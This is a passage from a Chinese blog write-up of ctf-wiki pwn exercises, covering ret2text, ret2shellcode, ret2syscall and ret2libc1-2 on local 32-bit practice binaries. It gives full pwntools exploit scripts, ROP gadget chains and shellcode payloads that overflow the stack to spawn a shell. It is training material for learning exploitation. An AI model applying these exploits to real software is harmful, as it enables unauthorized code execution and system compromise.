</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048617</span><span style=color:#8ec07c>:	e8 c4 fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484e0 &lt;rand@plt>
</span><span style=color:#8ec07c> 804861c:	</span><span style=color:#d3869b>89 45 </span><span style=color:#8ec07c>f4             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,-</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ebp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804861f:	8d </span><span style=color:#d3869b>45 </span><span style=color:#8ec07c>f0             	</span><span style=color:#fa5c4b>lea    </span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>0x10</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ebp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048622</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>89 44 24 04          	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#d3869b>0x4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048626</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>04 24 60 87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x8048760</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804862d:	e8 be fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484f0 &lt;__isoc99_scanf@plt>
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048632</span><span style=color:#8ec07c>:	8b </span><span style=color:#d3869b>45 </span><span style=color:#8ec07c>f0             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>0x10</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ebp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048635</span><span style=color:#8ec07c>:	3b </span><span style=color:#d3869b>45 </span><span style=color:#8ec07c>f4             	</span><span style=color:#fa5c4b>cmp    </span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ebp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048638</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>75 </span><span style=color:#8ec07c>0c                	</span><span style=color:#fa5c4b>jne    </span><span style=color:#d3869b>8048646 </span><span style=color:#8ec07c>&lt;secure</span><span style=color:#fdf4c1>+</span><span style=color:#d3869b>0x49</span><span style=color:#8ec07c>>
</span><span style=color:#8ec07c> 804863a:	c7 </span><span style=color:#d3869b>04 24 63 87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x8048763</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048641</span><span style=color:#8ec07c>:	e8 4a fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048490 </span><span style=color:#8ec07c>&lt;system@plt>
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048646</span><span style=color:#8ec07c>:	c9                   	</span><span style=color:#fa5c4b>leave  
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048647</span><span style=color:#8ec07c>:	c3                   	</span><span style=color:#fa5c4b>ret    
</span></code></pre><p>人肉反编译下得到伪代码。<pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#fdf4c1>srand(</span><span style=color:#fabd2f>time</span><span style=color:#fdf4c1>())</span><span>;
</span><span>var_0xc </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>rand</span><span style=color:#fdf4c1>()</span><span>;
</span><span style=color:#fdf4c1>scanf(</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%d</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>, </span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>var_0x10)</span><span>;
</span><span style=color:#fa5c4b>if </span><span>(var_0xc </span><span style=color:#fe8019>!=</span><span> var_0x10) </span><span style=color:#fa5c4b>return</span><span>;
</span><span style=color:#fdf4c1>system(</span><span style=color:#b8bb26>"/bin/sh"</span><span style=color:#fdf4c1>)</span><span>;
</span></code></pre><p>soooooo，没必要硬怼随机数，直接跳到 <code>system("/bin/sh")</code> 就好。把 exploit 中跳转地址改成 <code>0x804863a</code> 完事。<h3 id=exploit>exploit</h3><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>'./bin/ret2text'</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>112</span><span style=color:#fe8019>+</span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;I'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x804863a</span><span style=color:#fdf4c1>))
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p><img alt=image-20220823115054852 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220823115054852.webp><h2 id=ret2shellcode>ret2shellcode</h2><blockquote><p>来源依然是 ctf-wiki 我就不放链接了。</blockquote><h3 id=ji-ben-xin-xi-1>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file 
</span><span>bin/ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : disabled
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi-1>行为分析</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » bin/ret2shellcode
</span><span>No system for you this time !!!
</span><span>noooooooooooo
</span><span>bye bye ~%
</span></code></pre><h3 id=fan-bian-yi-fen-xi-1>反编译分析</h3><p>这次换个工具。<p><img alt=image-20220823172802222 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220823172802222.webp><p>知名的 Ghidra，直接看 C 代码。<pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#fa5c4b>int </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
</span><span>{
</span><span>  </span><span style=color:#fa5c4b>char</span><span> buf [</span><span style=color:#d3869b>100</span><span>];
</span><span>  </span><span style=color:#fa5c4b>char</span><span> local_74 [</span><span style=color:#d3869b>112</span><span>];
</span><span>  
</span><span>  </span><span style=color:#fabd2f>setvbuf</span><span style=color:#fdf4c1>(stdout,(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>setvbuf</span><span style=color:#fdf4c1>(stdin,(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"No system for you this time !!!"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>gets</span><span style=color:#fdf4c1>(local_74)</span><span>;
</span><span>  </span><span style=color:#fabd2f>strncpy</span><span style=color:#fdf4c1>(buf2,local_74,</span><span style=color:#d3869b>100</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"bye bye ~"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
</span><span>}
</span></code></pre><p>不装模作样分析，直接看<code>strncpy</code>，函数签名是 <code>strncpy(char* dest,const char* src, size_t count)</code>，写入的位置 <code>buf2</code> 观察下有没有执行权限。<code>buf2</code> 是可读写全局变量，这种全局变量放置在<code>.bss</code>段，所以直接看<code>.bss</code>段有没有可执行属性。<p><img alt=image-20220823181351695 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220823181351695.webp><p>emmm......<p><img alt=image-20220823181428657 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220823181428657.webp><p>emmmmmmmmmm..........<p>好。那不用看 ctf-wiki 的题解了，按自己的思路来。<code>checksec</code> 的结果是 <code>NX: false</code>，栈上有可执行权限。而且没有 PIE，关了 ASLR 直接硬编码栈上地址就完事。<p>老规矩算一下 buf <code>0xffffd0ec</code> 到返回地址的 <code>0xffffd15c</code> 距离，溢出后地址设置为<code>buf</code>的地址。计算得距离 112 字节，接下来写 exploit 。<h3 id=exploit-1>exploit</h3><blockquote><p>注意环境变量数量会影响 <code>&buf</code> 的地址，为了保证得到的地址和 <code>pwn.process</code> 启动一致，最好调试时也使用 <code>pwn.gdb.debug</code> 启动，设置下 <code>env={}</code>。或自己管理环境变量，确保不影响栈上变量的地址。</blockquote><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span>shellcraft
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>'./bin/ret2shellcode'</span><span style=color:#fdf4c1>, env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{})
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.asm(shellcraft.linux.sh())
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A' </span><span style=color:#fe8019>* </span><span>(</span><span style=color:#d3869b>112 </span><span style=color:#fe8019>- </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(payload)</span><span>)
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;I'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0xffffddcc</span><span style=color:#fdf4c1>)
</span><span style=color:#fdf4c1>p.sendline(payload)
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p><img alt=image-20220824095344282 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824095344282.webp><h2 id=ret2syscall>ret2syscall</h2><blockquote><p>题目来自 ctf-wiki。</blockquote><h3 id=ji-ben-xin-xi-2>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file
</span><span>bin/ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : ENABLED
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi-2>行为分析</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » bin/ret2syscall
</span><span>This time, no system() and NO SHELLCODE!!!
</span><span>What do you plan to do?
</span><span>123
</span></code></pre><h3 id=fan-bian-yi-fen-xi-2>反编译分析</h3><p>还是 Ghidra ，熟悉下工具。<p><img alt=image-20220824102626145 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824102626145.webp><p>只有一个输入，buf实际长度应该是100，和返回地址距离112。因为NX开启栈段是没有执行权限的。简单翻一下 PLT 发现也确实没有 <code>system</code> 函数。<p>x86 32位系统调用 int 80h 方式需要通过寄存器传参和传递系统调用号，单覆盖一个返回地址是屁用没有的。想要构造出系统调用必须的上下文（覆盖给定的寄存器），就需要找到一个或多个 <code>pop; ret</code> 指令序列，填充好寄存器后再跳转到 <code>int $0x80</code>指令处。<p>需要控制的寄存器有：<code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code> 四个。<p>用 ROPGadget 查找可用的 Gadgets 。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only 'pop|ret' | grep 'eax'
</span><span>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
</span><span>0x080bb196 : pop eax ; ret
</span><span>0x0807217a : pop eax ; ret 0x80e
</span><span>0x0804f704 : pop eax ; ret 3
</span><span>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
</span></code></pre><p>第一个和第六个都能控制多个寄存器，但都有多余的 <code>pop</code> 指令，我们先选第二个 <code>0x080bb196 : pop eax ; ret</code> 再搜索控制<code>ebx</code>的指令序列。简单起见我就把其他结果略了，下面的结果正好控制了剩余三个寄存器 <code>ebx</code>、<code>ecx</code>、<code>edx</code>。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
</span></code></pre><p>再寻找一个 <code>int $0x80</code> 。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only 'int'
</span><span>Gadgets information
</span><span>============================================================
</span><span>0x08049421 : int 0x80
</span></code></pre><p>然后顺便找一下有没有现成的 <code>/bin/sh</code> 或者 <code>sh</code> 字符串可以用。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --string '/bin/sh'
</span><span>Strings information
</span><span>============================================================
</span><span>0x080be408 : /bin/sh
</span></code></pre><p>我们最终想要得到的栈是这样的：<p><img alt=image-20220824135729859 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824135729859.webp><p>现在已经凑齐了所有要素，可以开始写 exploit 。<h3 id=exploit-2>exploit</h3><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>'./bin/ret2syscall'</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#928374;font-style:italic># gadgets chain
</span><span>gadget1 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0x080bb196</span><span style=color:#fdf4c1>) </span><span style=color:#928374;font-style:italic># pop eax; ret
</span><span>eax </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>11</span><span style=color:#fdf4c1>)
</span><span>gadget2 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0x0806eb90</span><span style=color:#fdf4c1>) </span><span style=color:#928374;font-style:italic># pop edx; pop ecx; pop ebx; ret
</span><span>edx </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)
</span><span>ecx </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)
</span><span>ebx </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0x080be408</span><span style=color:#fdf4c1>)
</span><span>gadget3 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.p32(</span><span style=color:#d3869b>0x08049421</span><span style=color:#fdf4c1>) </span><span style=color:#928374;font-style:italic># int 0x80
</span><span>
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>.join([</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>112</span><span style=color:#fdf4c1>, gadget1, eax, gadget2, edx, ecx, ebx, gadget3])
</span><span style=color:#fdf4c1>p.sendline(payload)
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p><img alt=image-20220824143615364 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824143615364.webp><h2 id=ret2libc1>ret2libc1</h2><h3 id=ji-ben-xin-xi-3>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file
</span><span>bin/ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : ENABLED
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi-3>行为分析</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc1
</span><span>RET2LIBC >_&lt;
</span><span>hi
</span></code></pre><h3 id=fan-bian-yi-fen-xi-3>反编译分析</h3><p><img alt=image-20220824144511924 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824144511924.webp><p>老样子。112偏移，看一眼有没有可利用的字符串。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc1 --string '/bin/sh'
</span><span>Strings information
</span><span>============================================================
</span><span>0x08048720 : /bin/sh
</span></code></pre><p>再看一眼 PLT 有没有 <code>system</code> 函数。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc1 | grep system
</span><span>08048460 &lt;system@plt>:
</span></code></pre><p>接下来就简单了，直接写 exploit 。<h3 id=exploit-3>exploit</h3><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>'./bin/ret2libc1'</span><span style=color:#fdf4c1>, env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{})
</span><span style=color:#928374;font-style:italic>#                          &system  reta  "/bin/sh"
</span><span style=color:#fdf4c1>p.sendline(flat([</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>112</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x08048460</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x08048720</span><span style=color:#fdf4c1>]))
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p><img alt=image-20220824150019457 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824150019457.webp><h2 id=ret2libc2>ret2libc2</h2><h3 id=ji-ben-xin-xi-4>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file
</span><span>bin/ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : ENABLED
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi-4>行为分析</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc2
</span><span>Something surprise here, but I don't think it will work.
</span><span>What do you think ?no
</span></code></pre><h3 id=fan-bian-yi-fen-xi-4>反编译分析</h3><p><img alt=image-20220824151009192 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824151009192.webp><p><code>main</code> 函数里没有有用的内容。搜索 <code>/bin/sh</code> 字符串无结果，但有 <code>system</code> 函数。那我们考虑下怎么往里面填一个 <code>/bin/sh</code> 。大致扫上一眼没有别的值得关注的地方，就开始考虑下怎么填字符串。<p>填字符串最直接的办法就是往栈上压，然后栈上地址传给 <code>system</code> 。缺点是这个做法在开启 PIE 的时候就没成功过，大概是栈上变量的地址一直在变。<p>另一个办法是找个 RW 权限的内存段往里面写，然后把地址传给 <code>system</code>。注意到导出符号有一个全局变量 <code>buf2</code>。<p><img alt=image-20220824151516232 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824151516232.webp><p><code>buf2</code> 是一个可写的全局变量，在<code>.bss</code>段里，我们直接用它，配合 <code>gets</code> 来控制程序读 <code>/bin/sh</code> 字符串。<p>预期的栈结构如下。<p><img alt=image-20220824151928918 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824151928918.webp><p><code>gets</code> 读取完<code>/bin/sh</code>后直接跳转<code>system</code>，原先作为<code>gets</code>参数的<code>buf2</code>地址就变成了<code>system</code>的返回地址，不过我们不在乎。第二个<code>buf2</code>则变成了<code>system</code>的参数。<p>从 plt 取 <code>gets</code> 和 <code>system</code> 函数的地址，然后开始写 exploit 。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep system
</span><span>08048490 &lt;system@plt>:
</span><span>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep gets
</span><span>08048460 &lt;gets@plt>:
</span></code></pre><h3 id=exploit-4>exploit</h3><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>'./bin/ret2libc2'</span><span style=color:#fdf4c1>, env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{})
</span><span style=color:#fdf4c1>p.sendline(flat([</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>112</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x08048460</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x08048490</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x0804a080</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x0804a080</span><span style=color:#fdf4c1>]))
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'/bin/sh'</span><span style=color:#fdf4c1>)
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p><img alt=image-20220824152429647 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824152429647.webp><h2 id=ret2libc3>ret2libc3</h2><h3 id=ji-ben-xin-xi-5>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file
</span><span>bin/ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : ENABLED
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi-5>行为分析</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc3
</span><span>No surprise anymore, system disappeard QQ.
</span><span>Can you find it !?no
</span></code></pre><h3 id=fan-bian-yi-fen-xi-5>反编译分析</h3><p><img alt=image-20220824152800977 src=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/image-20220824152800977.webp><p>查看 plt 发现确实没有 <code>system</code> 函数。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc3 | grep system
</span><span>(.venv) vm :: repos/pwn/lab-4 »
</span></code></pre><p>能不能用 <code>ret2syscall</code> 的技巧呢？<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc3 --only 'pop|ret'                                                                                                                            1 ↵
</span><span>Gadgets information
</span><span>============================================================
</span><span>0x080486ff : pop ebp ; ret
</span><span>0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
</span><span>0x0804841d : pop ebx ; ret
</span><span>0x080486fe : pop edi ; pop ebp ; ret
</span><span>0x080486fd : pop esi ; pop edi ; pop ebp ; ret
</span><span>0x08048406 : ret
</span><span>0x0804854e : ret 0xeac1
</span><span>
</span><span>Unique gadgets found: 7
</span></code></pre><p>很遗憾，缺乏控制 <code>ecx</code> 和 <code>edx</code> 寄存器的 gadget 。直接快进到找 <code>system</code> 地址。学习一下 ctf-wiki 上关于找 libc 里地址的方法。装个 <code>libcsearcher</code>，整理下思路。<p>取得<code>system</code>函数的原理是利用 <code>libc.so</code> 库函数之间相对偏移确定这一点，只要已知 libc 版本和一个 libc 函数的地址，即可推算出其他 libc 函数的地址。利用这一原理取得 libc 地址需要先知道当前 libc 版本和一个已知地址。<p>取得已知地址则又需要一点点技巧，因为 GOT 是延迟绑定的。也就是说，只有在第一次调用后，GOT 里填充的值才是真正的地址。在第一次调用前，里面填充其实是 PLT 的地址。我们用代码说话。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#d3869b>08048490 </span><span style=color:#8ec07c>&lt;__libc_start_main@plt>:
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048490</span><span style=color:#8ec07c>:       ff </span><span style=color:#d3869b>25 24 </span><span style=color:#8ec07c>a0 </span><span style=color:#d3869b>04 08       </span><span style=color:#fa5c4b>jmp    </span><span style=color:#fdf4c1>*</span><span style=color:#d3869b>0x804a024
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048496</span><span style=color:#8ec07c>:       </span><span style=color:#d3869b>68 30 00 00 00          </span><span style=color:#fa5c4b>push   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x30
</span><span style=color:#8ec07c> 804849b:       e9 </span><span style=color:#d3869b>80 </span><span style=color:#8ec07c>ff ff ff          </span><span style=color:#fa5c4b>jmp    </span><span style=color:#d3869b>8048420 </span><span style=color:#8ec07c>&lt;.plt>
